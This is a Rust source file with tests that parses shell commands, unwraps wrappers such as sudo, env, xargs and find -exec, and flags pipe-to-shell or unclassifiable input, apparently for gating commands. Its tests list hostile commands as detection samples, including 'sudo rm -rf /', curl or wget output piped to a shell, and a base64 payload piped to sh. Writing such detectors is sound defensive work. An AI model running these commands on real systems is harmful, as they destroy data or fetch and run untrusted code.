const MAX_RECURSION_DEPTH: usize = 4;
const PIPE_TO_SHELL: &str = "pipe-to-shell";
const UNCLASSIFIABLE: &str = "unclassifiable-command";

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Segment {
    pub argv: Vec<String>,
    pipe_from_previous: bool,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct CommandSegments {
    pub segments: Vec<Segment>,
    pub parse_ok: bool,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Quote {
    Single,
    Double,
    Backtick,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct RawSegment {
    command: String,
    pipe_from_previous: bool,
}

pub fn extract_command_segments(command: &str) -> CommandSegments {
    if is_windows_command(command) {
        return CommandSegments {
            segments: Vec::new(),
            parse_ok: false,
        };
    }

    let mut segments = Vec::new();
    let parse_ok = extract_recursive(command, 0, false, &mut segments).is_ok();
    let parse_ok = parse_ok
        && !segments
            .iter()
            .any(|segment| executable_basename(segment).is_some_and(is_windows_executable));
    CommandSegments { segments, parse_ok }
}

pub fn structural_flags(segments: &CommandSegments) -> Vec<&'static str> {
    if !segments.parse_ok {
        return vec![UNCLASSIFIABLE];
    }
    if segments
        .segments
        .iter()
        .any(|segment| segment.pipe_from_previous && is_shell(segment))
    {
        vec![PIPE_TO_SHELL]
    } else {
        Vec::new()
    }
}

pub fn segment_command(segment: &Segment) -> String {
    segment.argv.join(" ")
}

pub fn executable_basename(segment: &Segment) -> Option<&str> {
    segment
        .argv
        .first()
        .and_then(|value| value.rsplit(['/', '\\']).next())
        .filter(|value| !value.is_empty())
}

fn executable_is(segment: &Segment, names: &[&str]) -> bool {
    executable_basename(segment).is_some_and(|value| names.contains(&value))
}

fn is_shell(segment: &Segment) -> bool {
    executable_is(segment, &["sh", "bash", "zsh", "dash"])
}

fn extract_recursive(
    command: &str,
    depth: usize,
    incoming_pipe: bool,
    output: &mut Vec<Segment>,
) -> Result<(), ()> {
    if depth > MAX_RECURSION_DEPTH {
        return Err(());
    }
    if command.contains("<(") || command.contains(">(") {
        return Err(());
    }

    let (outer_command, here_doc_bodies) = extract_here_docs(command)?;
    let raw_segments = split_top_level(&outer_command)?;
    let mut nested = Vec::new();
    let mut ambiguous_command_word = false;
    for (index, raw) in raw_segments.iter().enumerate() {
        nested.extend(
            nested_commands(&raw.command)?
                .into_iter()
                .map(|command| (command, false)),
        );
        let argv = shell_words::split(raw.command.trim()).map_err(|_| ())?;
        if argv.is_empty() {
            continue;
        }
        let argv = strip_leading_assignments(&argv);
        if argv.is_empty() {
            continue;
        }
        if command_word_is_dynamic(&argv[0], &raw.command) {
            ambiguous_command_word = true;
            continue;
        }
        let pipe_from_previous = raw.pipe_from_previous || (index == 0 && incoming_pipe);
        output.push(Segment {
            argv: argv.clone(),
            pipe_from_previous,
        });

        if let Some(inner) = shell_inner_command(&argv) {
            nested.push((inner.to_string(), false));
        }
        if let Some(inner) = shell_here_string(&argv)? {
            nested.push((inner, false));
        }
        if let Some(inner) = eval_inner_command(&argv)? {
            nested.push((inner, false));
        }
        for forwarded in forwarded_commands(&argv)? {
            nested.push((shell_words::join(forwarded), pipe_from_previous));
        }
    }
    nested.extend(here_doc_bodies.into_iter().map(|body| (body, false)));
    for (inner, pipe_from_previous) in nested {
        extract_recursive(&inner, depth + 1, pipe_from_previous, output)?;
    }
    if ambiguous_command_word {
        Err(())
    } else {
        Ok(())
    }
}

fn strip_leading_assignments(argv: &[String]) -> Vec<String> {
    argv.iter()
        .skip_while(|value| is_assignment(value))
        .cloned()
        .collect()
}

fn is_assignment(value: &str) -> bool {
    let Some((name, _)) = value.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    chars
        .next()
        .is_some_and(|ch| ch == '_' || ch.is_ascii_alphabetic())
        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

fn command_word_is_dynamic(value: &str, command: &str) -> bool {
    let trimmed = command.trim();
    value.starts_with('$')
        || value.contains('`')
        || trimmed.starts_with("$(")
        || trimmed.starts_with('`')
}

fn forwarded_commands(argv: &[String]) -> Result<Vec<Vec<String>>, ()> {
    let Some(executable) = argv
        .first()
        .and_then(|value| value.rsplit(['/', '\\']).next())
    else {
        return Ok(Vec::new());
    };
    let forwarded = match executable {
        "command" => unwrap_command(argv)?,
        "builtin" => unwrap_simple(argv, &["--"])?,
        "exec" => unwrap_exec(argv)?,
        "env" => unwrap_env(argv)?,
        "nohup" => unwrap_simple(argv, &["--"])?,
        "nice" => unwrap_nice(argv)?,
        "ionice" => unwrap_ionice(argv)?,
        "time" => unwrap_time(argv)?,
        "timeout" => unwrap_timeout(argv)?,
        "stdbuf" => unwrap_stdbuf(argv)?,
        "setsid" => unwrap_setsid(argv)?,
        "xargs" => unwrap_xargs(argv)?,
        "sudo" => unwrap_sudo(argv)?,
        "doas" => unwrap_doas(argv)?,
        "find" => return find_exec_commands(argv),
        _ => None,
    };
    Ok(forwarded.into_iter().collect())
}

fn unwrap_command(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-p" => index += 1,
            "-v" | "-V" => return Ok(None),
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    Ok(tail(argv, index))
}

fn unwrap_simple(argv: &[String], flags: &[&str]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        if value == "--" {
            index += 1;
            break;
        }
        if flags.contains(&value.as_str()) {
            index += 1;
            continue;
        }
        if value.starts_with('-') {
            return Err(());
        }
        break;
    }
    Ok(tail(argv, index))
}

fn unwrap_exec(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-a" => index = skip_option_value(argv, index)?,
            "-c" | "-l" => index += 1,
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    Ok(tail(argv, index))
}

fn unwrap_env(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-i" | "--ignore-environment" | "-0" | "--null" | "-v" | "--debug" => index += 1,
            "-u" | "--unset" | "-C" | "--chdir" => index = skip_option_value(argv, index)?,
            "-S" | "--split-string" => {
                let value_index = index + 1;
                let split = shell_words::split(argv.get(value_index).ok_or(())?).map_err(|_| ())?;
                let mut command = split;
                command.extend_from_slice(&argv[value_index + 1..]);
                return Ok((!command.is_empty()).then_some(command));
            }
            value
                if value.starts_with("--unset=")
                    || value.starts_with("--chdir=")
                    || is_assignment(value) =>
            {
                index += 1
            }
            value if value.starts_with("--split-string=") => {
                let split =
                    shell_words::split(value.split_once('=').ok_or(())?.1).map_err(|_| ())?;
                let mut command = split;
                command.extend_from_slice(&argv[index + 1..]);
                return Ok((!command.is_empty()).then_some(command));
            }
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    while argv.get(index).is_some_and(|value| is_assignment(value)) {
        index += 1;
    }
    Ok(tail(argv, index))
}

fn unwrap_nice(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-n" | "--adjustment" => index = skip_option_value(argv, index)?,
            value if value.starts_with("--adjustment=") => index += 1,
            value
                if value
                    .strip_prefix('-')
                    .is_some_and(|number| number.parse::<i32>().is_ok()) =>
            {
                index += 1
            }
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    Ok(tail(argv, index))
}

fn unwrap_ionice(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-c" | "--class" | "-n" | "--classdata" | "-p" | "--pid" | "-P" | "--pgid" | "-u"
            | "--uid" => index = skip_option_value(argv, index)?,
            "-t" | "--ignore" => index += 1,
            value
                if ["--class=", "--classdata=", "--pid=", "--pgid=", "--uid="]
                    .iter()
                    .any(|prefix| value.starts_with(prefix)) =>
            {
                index += 1
            }
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    Ok(tail(argv, index))
}

fn unwrap_time(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-o" | "--output" | "-f" | "--format" => index = skip_option_value(argv, index)?,
            "-a" | "--append" | "-p" | "--portability" | "-v" | "--verbose" => index += 1,
            value if value.starts_with("--output=") || value.starts_with("--format=") => index += 1,
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    Ok(tail(argv, index))
}

fn unwrap_timeout(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-s" | "--signal" | "-k" | "--kill-after" => index = skip_option_value(argv, index)?,
            "--foreground" | "--preserve-status" | "-v" | "--verbose" => index += 1,
            value if value.starts_with("--signal=") || value.starts_with("--kill-after=") => {
                index += 1
            }
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    if argv.get(index).is_some() {
        index += 1;
    }
    Ok(tail(argv, index))
}

fn unwrap_stdbuf(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-i" | "--input" | "-o" | "--output" | "-e" | "--error" => {
                index = skip_option_value(argv, index)?
            }
            value
                if ["--input=", "--output=", "--error="]
                    .iter()
                    .any(|prefix| value.starts_with(prefix)) =>
            {
                index += 1
            }
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    Ok(tail(argv, index))
}

fn unwrap_setsid(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-f" | "--fork" | "-c" | "--ctty" | "-w" | "--wait" => index += 1,
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    Ok(tail(argv, index))
}

fn unwrap_xargs(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-a" | "--arg-file" | "-d" | "--delimiter" | "-E" | "--eof" | "-I" | "--replace"
            | "-L" | "--max-lines" | "-n" | "--max-args" | "-P" | "--max-procs" | "-s"
            | "--max-chars" => index = skip_option_value(argv, index)?,
            "-0" | "--null" | "-r" | "--no-run-if-empty" | "-t" | "--verbose" | "-x" | "--exit" => {
                index += 1
            }
            value
                if [
                    "--arg-file=",
                    "--delimiter=",
                    "--eof=",
                    "--replace=",
                    "--max-lines=",
                    "--max-args=",
                    "--max-procs=",
                    "--max-chars=",
                ]
                .iter()
                .any(|prefix| value.starts_with(prefix)) =>
            {
                index += 1
            }
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    Ok(tail(argv, index))
}

fn unwrap_sudo(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-u" | "--user" | "-g" | "--group" | "-h" | "--host" | "-p" | "--prompt" | "-C"
            | "--close-from" | "-D" | "--chdir" | "-R" | "--chroot" | "-T"
            | "--command-timeout" | "-r" | "--role" | "-t" | "--type" => {
                index = skip_option_value(argv, index)?
            }
            "-A" | "--askpass" | "-b" | "--background" | "-E" | "--preserve-env" | "-H"
            | "--set-home" | "-i" | "--login" | "-n" | "--non-interactive" | "-P"
            | "--preserve-groups" | "-S" | "--stdin" => index += 1,
            value
                if [
                    "--user=",
                    "--group=",
                    "--host=",
                    "--prompt=",
                    "--close-from=",
                    "--chdir=",
                    "--chroot=",
                    "--command-timeout=",
                    "--role=",
                    "--type=",
                    "--preserve-env=",
                ]
                .iter()
                .any(|prefix| value.starts_with(prefix)) =>
            {
                index += 1
            }
            value if is_assignment(value) => index += 1,
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    Ok(tail(argv, index))
}

fn unwrap_doas(argv: &[String]) -> Result<Option<Vec<String>>, ()> {
    let mut index = 1;
    while let Some(value) = argv.get(index) {
        match value.as_str() {
            "--" => {
                index += 1;
                break;
            }
            "-a" | "-C" | "-u" => index = skip_option_value(argv, index)?,
            "-n" | "-s" => index += 1,
            value if value.starts_with('-') => return Err(()),
            _ => break,
        }
    }
    Ok(tail(argv, index))
}

fn find_exec_commands(argv: &[String]) -> Result<Vec<Vec<String>>, ()> {
    let mut commands = Vec::new();
    let mut index = 1;
    while index < argv.len() {
        if matches!(argv[index].as_str(), "-exec" | "-execdir") {
            let start = index + 1;
            let relative_end = argv[start..]
                .iter()
                .position(|value| matches!(value.as_str(), ";" | "+"))
                .ok_or(())?;
            let end = start + relative_end;
            if end == start {
                return Err(());
            }
            commands.push(argv[start..end].to_vec());
            index = end + 1;
        } else {
            index += 1;
        }
    }
    Ok(commands)
}

fn skip_option_value(argv: &[String], index: usize) -> Result<usize, ()> {
    argv.get(index + 1).ok_or(())?;
    Ok(index + 2)
}

fn tail(argv: &[String], index: usize) -> Option<Vec<String>> {
    (index < argv.len()).then(|| argv[index..].to_vec())
}

fn eval_inner_command(argv: &[String]) -> Result<Option<String>, ()> {
    if argv
        .first()
        .and_then(|value| value.rsplit(['/', '\\']).next())
        != Some("eval")
    {
        return Ok(None);
    }
    if argv.len() == 1 {
        return Ok(None);
    }
    let inner = argv[1..].join(" ");
    if inner.contains('$') || inner.contains('`') {
        return Err(());
    }
    Ok(Some(inner))
}

fn shell_here_string(argv: &[String]) -> Result<Option<String>, ()> {
    let executable = argv
        .first()
        .and_then(|value| value.rsplit(['/', '\\']).next());
    if !matches!(executable, Some("sh" | "bash" | "zsh" | "dash")) {
        return Ok(None);
    }
    for (index, value) in argv.iter().enumerate() {
        if value == "<<<" {
            return argv.get(index + 1).cloned().map(Some).ok_or(());
        }
        if let Some(inner) = value.strip_prefix("<<<") {
            if !inner.is_empty() {
                return Ok(Some(inner.to_string()));
            }
        }
    }
    Ok(None)
}

fn extract_here_docs(command: &str) -> Result<(String, Vec<String>), ()> {
    let lines: Vec<&str> = command.lines().collect();
    let mut outer = Vec::new();
    let mut bodies = Vec::new();
    let mut index = 0;
    while index < lines.len() {
        let line = lines[index];
        let Some((delimiter, literal)) = here_doc_delimiter(line)? else {
            outer.push(line);
            index += 1;
            continue;
        };
        if !literal {
            return Err(());
        }
        outer.push(line);
        let argv = shell_words::split(line).map_err(|_| ())?;
        let argv = strip_leading_assignments(&argv);
        let shell_receives_body = argv
            .first()
            .and_then(|value| value.rsplit(['/', '\\']).next())
            .is_some_and(|value| matches!(value, "sh" | "bash" | "zsh" | "dash"));
        index += 1;
        let body_start = index;
        while index < lines.len() && lines[index].trim() != delimiter {
            index += 1;
        }
        if index == lines.len() {
            return Err(());
        }
        if shell_receives_body {
            bodies.push(lines[body_start..index].join("\n"));
        }
        index += 1;
    }
    Ok((outer.join("\n"), bodies))
}

fn here_doc_delimiter(line: &str) -> Result<Option<(String, bool)>, ()> {
    let chars: Vec<char> = line.chars().collect();
    let mut index = 0;
    while index + 1 < chars.len() {
        if chars[index] != '<'
            || chars[index + 1] != '<'
            || chars.get(index + 2) == Some(&'<')
            || index
                .checked_sub(1)
                .is_some_and(|before| chars[before] == '<')
        {
            index += 1;
            continue;
        }
        index += 2;
        if chars.get(index) == Some(&'-') {
            index += 1;
        }
        while chars.get(index).is_some_and(|value| value.is_whitespace()) {
            index += 1;
        }
        let quote = chars
            .get(index)
            .copied()
            .filter(|value| matches!(value, '\'' | '"'));
        if quote.is_some() {
            index += 1;
        }
        let start = index;
        while let Some(value) = chars.get(index) {
            if quote.is_some_and(|quote| *value == quote)
                || (quote.is_none() && (value.is_whitespace() || matches!(value, ';' | '|' | '&')))
            {
                break;
            }
            index += 1;
        }
        if start == index {
            return Err(());
        }
        let delimiter: String = chars[start..index].iter().collect();
        if let Some(quote) = quote {
            if chars.get(index) != Some(&quote) {
                return Err(());
            }
        }
        return Ok(Some((delimiter, quote.is_some())));
    }
    Ok(None)
}

fn split_top_level(command: &str) -> Result<Vec<RawSegment>, ()> {
    let chars: Vec<char> = command.chars().collect();
    let mut raw_segments = Vec::new();
    let mut start = 0;
    let mut index = 0;
    let mut quote = None;
    let mut escaped = false;
    let mut paren_depth = 0usize;
    let mut incoming_pipe = false;

    while index < chars.len() {
        let ch = chars[index];
        if escaped {
            escaped = false;
            index += 1;
            continue;
        }
        if ch == '\\' && quote != Some(Quote::Single) {
            escaped = true;
            index += 1;
            continue;
        }
        match quote {
            Some(Quote::Single) => {
                if ch == '\'' {
                    quote = None;
                }
                index += 1;
                continue;
            }
            Some(Quote::Double) => {
                if ch == '"' {
                    quote = None;
                }
                index += 1;
                continue;
            }
            Some(Quote::Backtick) => {
                if ch == '`' {
                    quote = None;
                }
                index += 1;
                continue;
            }
            None => {}
        }
        match ch {
            '\'' => quote = Some(Quote::Single),
            '"' => quote = Some(Quote::Double),
            '`' => quote = Some(Quote::Backtick),
            '(' => paren_depth += 1,
            ')' => {
                paren_depth = paren_depth.checked_sub(1).ok_or(())?;
            }
            _ => {}
        }
        if paren_depth == 0 {
            let delimiter_len = delimiter_len(&chars, index);
            if delimiter_len > 0 {
                let text: String = chars[start..index].iter().collect();
                push_raw_segment(&mut raw_segments, text, incoming_pipe);
                incoming_pipe = ch == '|' && delimiter_len == 1;
                index += delimiter_len;
                start = index;
                continue;
            }
        }
        index += 1;
    }

    if escaped || quote.is_some() || paren_depth != 0 {
        return Err(());
    }
    let text: String = chars[start..].iter().collect();
    push_raw_segment(&mut raw_segments, text, incoming_pipe);
    Ok(raw_segments)
}

fn delimiter_len(chars: &[char], index: usize) -> usize {
    match chars[index] {
        ';' | '\n' => 1,
        '|' => {
            if chars.get(index + 1) == Some(&'|') {
                2
            } else {
                1
            }
        }
        '&' => {
            if matches!(chars.get(index.wrapping_sub(1)), Some('>') | Some('<'))
                || chars.get(index + 1) == Some(&'>')
            {
                0
            } else if chars.get(index + 1) == Some(&'&') {
                2
            } else {
                1
            }
        }
        _ => 0,
    }
}

fn push_raw_segment(output: &mut Vec<RawSegment>, command: String, pipe_from_previous: bool) {
    if !command.trim().is_empty() {
        output.push(RawSegment {
            command,
            pipe_from_previous,
        });
    }
}

fn nested_commands(command: &str) -> Result<Vec<String>, ()> {
    let chars: Vec<char> = command.chars().collect();
    let mut commands = Vec::new();
    let mut index = 0;
    let mut quote = None;
    let mut escaped = false;

    while index < chars.len() {
        let ch = chars[index];
        if escaped {
            escaped = false;
            index += 1;
            continue;
        }
        if ch == '\\' && quote != Some(Quote::Single) {
            escaped = true;
            index += 1;
            continue;
        }
        if quote == Some(Quote::Single) {
            if ch == '\'' {
                quote = None;
            }
            index += 1;
            continue;
        }
        if ch == '\'' && quote.is_none() {
            quote = Some(Quote::Single);
            index += 1;
            continue;
        }
        if ch == '"' {
            quote = if quote == Some(Quote::Double) {
                None
            } else if quote.is_none() {
                Some(Quote::Double)
            } else {
                quote
            };
            index += 1;
            continue;
        }
        if ch == '`' {
            let end = find_backtick_end(&chars, index + 1)?;
            commands.push(chars[index + 1..end].iter().collect());
            index = end + 1;
            continue;
        }
        if ch == '$' && chars.get(index + 1) == Some(&'(') {
            let end = find_closing_paren(&chars, index + 1)?;
            commands.push(chars[index + 2..end].iter().collect());
            index = end + 1;
            continue;
        }
        if ch == '(' && is_command_group_start(&chars, index) {
            let end = find_closing_paren(&chars, index)?;
            commands.push(chars[index + 1..end].iter().collect());
            index = end + 1;
            continue;
        }
        index += 1;
    }
    Ok(commands)
}

fn find_backtick_end(chars: &[char], mut index: usize) -> Result<usize, ()> {
    let mut escaped = false;
    while index < chars.len() {
        if escaped {
            escaped = false;
        } else if chars[index] == '\\' {
            escaped = true;
        } else if chars[index] == '`' {
            return Ok(index);
        }
        index += 1;
    }
    Err(())
}

fn find_closing_paren(chars: &[char], open: usize) -> Result<usize, ()> {
    let mut depth = 1usize;
    let mut quote = None;
    let mut escaped = false;
    let mut index = open + 1;
    while index < chars.len() {
        let ch = chars[index];
        if escaped {
            escaped = false;
            index += 1;
            continue;
        }
        if ch == '\\' && quote != Some(Quote::Single) {
            escaped = true;
            index += 1;
            continue;
        }
        match quote {
            Some(Quote::Single) if ch == '\'' => quote = None,
            Some(Quote::Double) if ch == '"' => quote = None,
            Some(Quote::Backtick) if ch == '`' => quote = None,
            Some(_) => {}
            None => match ch {
                '\'' => quote = Some(Quote::Single),
                '"' => quote = Some(Quote::Double),
                '`' => quote = Some(Quote::Backtick),
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth == 0 {
                        return Ok(index);
                    }
                }
                _ => {}
            },
        }
        index += 1;
    }
    Err(())
}

fn is_command_group_start(chars: &[char], index: usize) -> bool {
    if index > 0 && chars[index - 1] == '$' {
        return false;
    }
    chars[..index]
        .iter()
        .rev()
        .find(|value| !value.is_whitespace())
        .is_none_or(|value| matches!(value, ';' | '&' | '|' | '('))
}

fn shell_inner_command(argv: &[String]) -> Option<&str> {
    let executable = argv.first()?.rsplit(['/', '\\']).next()?;
    if !matches!(executable, "sh" | "bash" | "zsh" | "dash") {
        return None;
    }
    argv.windows(2)
        .find_map(|pair| matches!(pair[0].as_str(), "-c" | "-lc").then_some(pair[1].as_str()))
}

fn is_windows_command(command: &str) -> bool {
    let trimmed = command.trim_start();
    let executable = trimmed
        .split_whitespace()
        .next()
        .unwrap_or_default()
        .trim_matches(['\'', '"'])
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or_default()
        .to_ascii_lowercase();
    is_windows_executable(&executable)
        || (trimmed.as_bytes().get(1) == Some(&b':')
            && trimmed
                .as_bytes()
                .first()
                .is_some_and(u8::is_ascii_alphabetic))
        || trimmed.contains("$env:")
        || trimmed.contains("$Env:")
}

fn is_windows_executable(executable: &str) -> bool {
    matches!(
        executable.to_ascii_lowercase().as_str(),
        "cmd" | "cmd.exe" | "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn executable_names(command: &str) -> Vec<String> {
        extract_command_segments(command)
            .segments
            .iter()
            .filter_map(executable_basename)
            .map(str::to_string)
            .collect()
    }

    #[test]
    fn extracts_shell_structure_and_nested_commands() {
        for command in [
            "bash -c 'sudo rm -rf /'",
            "echo hi && sudo id",
            "true; sudo id",
            "$(sudo id)",
            "`sudo id`",
            "sh -c \"bash -c 'sudo id'\"",
            "(sudo id)",
        ] {
            let extracted = extract_command_segments(command);
            assert!(
                executable_names(command).iter().any(|name| name == "sudo"),
                "{command:?}: {extracted:?}"
            );
        }
    }

    #[test]
    fn flags_any_input_piped_to_shell() {
        for command in [
            "curl http://x | sh",
            "wget -qO- x | bash -s",
            "curl http://x $(echo suffix) | sh",
            "sh -c 'curl http://x | dash'",
            "printf 'sudo id\\n' | sh",
            "printf 'c3VkbyBpZAo=' | base64 -d | sh",
        ] {
            let extracted = extract_command_segments(command);
            assert_eq!(structural_flags(&extracted), vec![PIPE_TO_SHELL]);
        }
        for command in ["ls | grep sh", "curl http://x | cat", "echo sh"] {
            let extracted = extract_command_segments(command);
            assert!(structural_flags(&extracted).is_empty(), "{command:?}");
        }
    }

    #[test]
    fn executable_basename_does_not_match_arguments() {
        for command in ["echo sudo", "cat sudoku.txt"] {
            assert!(!executable_names(command).iter().any(|name| name == "sudo"));
        }
        let extracted = extract_command_segments("/usr/bin/sudo id");
        assert_eq!(executable_basename(&extracted.segments[0]), Some("sudo"));
    }

    #[test]
    fn depth_cap_preserves_partial_classification_and_fails_closed() {
        let mut command = "sudo id".to_string();
        for _ in 0..=MAX_RECURSION_DEPTH {
            command = shell_words::join(["sh", "-c", command.as_str()]);
        }
        let extracted = extract_command_segments(&command);
        assert!(!extracted.parse_ok);
        assert!(!extracted.segments.is_empty());
        assert_eq!(structural_flags(&extracted), vec![UNCLASSIFIABLE]);
    }

    #[test]
    fn parse_failure_and_windows_input_fail_closed() {
        for command in [
            "echo 'unterminated",
            "powershell.exe -Command 'sudo id'",
            "cmd /C dir",
            "true && pwsh -Command Get-ChildItem",
        ] {
            let extracted = extract_command_segments(command);
            assert!(!extracted.parse_ok, "{command:?}");
            assert_eq!(structural_flags(&extracted), vec![UNCLASSIFIABLE]);
        }
    }

    #[test]
    fn extracts_forwarded_commands_and_literal_shell_bodies() {
        for command in [
            "command sudo id",
            "builtin sudo id",
            "exec sudo id",
            "env X=1 sudo id",
            "nohup sudo id",
            "nice -n 5 sudo id",
            "ionice -c 3 sudo id",
            "time sudo id",
            "timeout 5 sudo id",
            "stdbuf -o L sudo id",
            "setsid sudo id",
            "xargs sudo id",
            "sudo -- sudo id",
            "doas -n sudo id",
            "find . -exec sudo id \\;",
            "eval 'sudo id'",
            "sh <<< 'sudo id'",
            "sh <<'EOF'\nsudo id\nEOF",
        ] {
            let extracted = extract_command_segments(command);
            assert!(extracted.parse_ok, "{command:?}: {extracted:?}");
            assert!(
                extracted
                    .segments
                    .iter()
                    .filter_map(executable_basename)
                    .any(|name| name == "sudo"),
                "{command:?}: {extracted:?}"
            );
        }
    }

    #[test]
    fn variable_indirection_is_unclassifiable() {
        let extracted = extract_command_segments("X=sudo; $X id");
        assert!(!extracted.parse_ok);
        assert_eq!(structural_flags(&extracted), vec![UNCLASSIFIABLE]);
    }

    #[test]
    fn expanding_here_doc_is_unclassifiable() {
        let extracted = extract_command_segments("cat <<EOF\n$(sudo id)\nEOF");
        assert!(!extracted.parse_ok);
        assert_eq!(structural_flags(&extracted), vec![UNCLASSIFIABLE]);
    }
}
